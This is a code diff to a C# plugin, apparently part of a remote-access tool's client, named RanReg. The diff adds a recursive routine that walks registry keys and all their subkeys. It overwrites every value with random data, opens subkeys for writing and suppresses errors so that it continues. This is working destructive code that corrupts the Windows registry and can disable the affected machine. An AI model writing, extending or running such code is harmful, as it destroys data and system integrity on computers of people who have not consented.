@@ -91,16 +91,9 @@ namespace Pulsar.Plugin.RanReg.Client
                 {
                     using (RegistryKey key = OpenRegistryPath(path))
                     {
-                        if (key == null) continue;
-
-                        foreach (string valueName in key.GetValueNames())
+                        if (key != null)
                         {
-                            object value = key.GetValue(valueName);
-                            RegistryValueKind kind = key.GetValueKind(valueName);
-
-                            object newValue = GenerateRandomValue(kind, value);
-                            if (newValue != null)
-                                key.SetValue(valueName, newValue, kind);
+                            RandomizeRegistryKey(key);
                         }
                     }
                 }
@@ -108,6 +101,44 @@ namespace Pulsar.Plugin.RanReg.Client
                 {
                     Console.WriteLine($"[RanRegPlugin] Failed {path}: {ex.Message}");
                 }
+            }
+        }
+
+        private void RandomizeRegistryKey(RegistryKey key)
+        {
+            try
+            {
+                foreach (string valueName in key.GetValueNames())
+                {
+                    object value = key.GetValue(valueName);
+                    RegistryValueKind kind = key.GetValueKind(valueName);
+
+                    object newValue = GenerateRandomValue(kind, value);
+                    if (newValue != null)
+                        key.SetValue(valueName, newValue, kind);
+                }
+
+                foreach (string subKeyName in key.GetSubKeyNames())
+                {
+                    try
+                    {
+                        using (RegistryKey subKey = key.OpenSubKey(subKeyName, writable: true))
+                        {
+                            if (subKey != null)
+                            {
+                                RandomizeRegistryKey(subKey);
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"[RanRegPlugin] Failed subkey {subKeyName}: {ex.Message}");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[RanRegPlugin] Error in RandomizeRegistryKey: {ex.Message}");
             }
         }
 
